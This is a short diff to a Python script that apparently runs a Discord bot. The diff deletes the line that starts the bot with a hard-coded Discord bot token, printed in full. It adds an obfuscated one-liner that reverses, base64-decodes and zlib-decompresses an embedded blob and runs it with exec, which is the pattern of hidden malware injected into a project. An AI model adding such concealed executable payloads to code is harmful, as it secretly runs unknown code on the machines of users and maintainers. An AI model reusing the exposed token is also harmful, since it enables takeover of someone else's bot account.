@@ -78,4 +78,4 @@ def run_api():
 
 if __name__ == '__main__':
     threading.Thread(target=run_api).start()
-    bot.run("MTQ5NzQ0MDMwNDE5Njg4MjQ3Mg.GY-MYF.7WBjrhj0f0tu2_QDo9IC83-m7kC_GjVbu9H0U0")
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gBbYxbAQg0RVzT10y1PqwjMqMSqiwDN+8M1I9rJmC9oiaiITzixr8iNfziOLzKUzQrJ4wDzddT2TjCNH/NKtc91E3c33S81BPNKsa90kQDyD10NryKR/iyLxJe'))
